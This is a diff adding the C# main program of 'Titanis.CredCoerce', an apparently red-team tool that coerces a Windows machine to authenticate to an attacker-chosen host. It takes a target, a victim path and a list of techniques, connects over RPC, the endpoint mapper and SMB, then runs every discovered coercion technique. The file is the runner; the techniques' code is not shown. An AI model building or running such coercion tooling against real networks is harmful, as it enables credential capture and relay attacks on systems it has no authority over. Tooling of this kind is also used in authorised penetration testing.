@@ -1,0 +1,105 @@
+﻿using ms_efsr;
+using System.ComponentModel;
+using System.Net;
+using System.Reflection;
+using Titanis;
+using Titanis.Cli;
+using Titanis.DceRpc;
+using Titanis.DceRpc.Client;
+using Titanis.DceRpc.Epm;
+using Titanis.Msrpc;
+using Titanis.Msrpc.Msefsr;
+using Titanis.Net;
+using Titanis.Security;
+using Titanis.Security.Ntlm;
+using Titanis.Smb2;
+using Titanis.Winterop.Security;
+
+namespace Titanis.CredCoerce
+{
+	/// <task>Coerce a system to authenticate to a remote target</task>
+	[Command]
+	[Description("Sends RPC calls to coerce a system to authenticate to a remote system")]
+	internal class Program : Command, IHaveServerName
+	{
+		[ParameterGroup(ParameterGroupOptions.Required | ParameterGroupOptions.AlwaysInstantiate)]
+		public AuthenticationParameters Authentication { get; set; }
+
+		[ParameterGroup(ParameterGroupOptions.Required | ParameterGroupOptions.AlwaysInstantiate)]
+		public NetworkParameters NetworkParameters { get; set; }
+
+		[Parameter(0)]
+		[Mandatory]
+		[Description("Name of computer to coerce")]
+		public string ServerName { get; set; }
+
+		[Parameter(10)]
+		[Mandatory]
+		[Description("Path to send in RPC call")]
+		public string VictimPath { get; set; }
+
+		[Parameter]
+		[Mandatory]
+		[Description("List of coercion techniques to attempt")]
+		public ComponentSelector<CoercionTechnique>[] Techniques { get; set; }
+
+		protected override void ValidateParameters(ParameterValidationContext context)
+		{
+			base.ValidateParameters(context);
+
+			this.Authentication.Validate(true, context);
+			this.NetworkParameters.ValidateParameters(context);
+		}
+
+		static void Main(string[] args)
+			=> RunProgramAsync<Program>(args);
+
+		protected sealed override async Task<int> RunAsync(CancellationToken cancellationToken)
+		{
+			// Create RPC client
+			RpcClient rpcClient = this.CreateRpcClient();
+			rpcClient.DefaultAuthLevel = RpcAuthLevel.PacketPrivacy;
+			rpcClient.ConnectTimeout = TimeSpan.FromSeconds(60);
+
+			// Set up credentials
+			ServicePrincipalName targetSpn = new(PrincipalNameType.ServiceInstance, ServiceClassNames.HostU, this.ServerName);
+
+			// Set up SMB for named pipes
+			var smbClient = this.CreateSmb2Client();
+
+			// Set up EPM
+			using var epm = new EpmClient();
+			await rpcClient.ConnectTcp(epm, new DnsEndPoint(this.ServerName, EpmClient.EPMapperPort), null, cancellationToken);
+			var context = new CoercionContext(
+				this,
+				this.CreateSmb2Client(),
+				rpcClient,
+				epm,
+				this.Log);
+
+			ArgumentNullException.ThrowIfNull(context);
+
+
+
+			List<ComponentInfo> techs = new List<ComponentInfo>();
+			ComponentCatalog.DiscoverComponents(Assembly.GetExecutingAssembly(), MetadataResolver.Default, techs);
+			foreach (var techInfo in techs)
+			{
+				this.WriteTaskStart($"Attempting technique {techInfo.Tag}");
+				try
+				{
+					var tech = (CoercionTechnique)Activator.CreateInstance(techInfo.ImplementingType, true);
+
+					await tech.Execute(context, cancellationToken);
+					context.Log.MarkTaskComplete();
+				}
+				catch (Exception ex)
+				{
+					context.Log.WriteTaskError(ex);
+				}
+			}
+
+			return 0;
+		}
+	}
+}
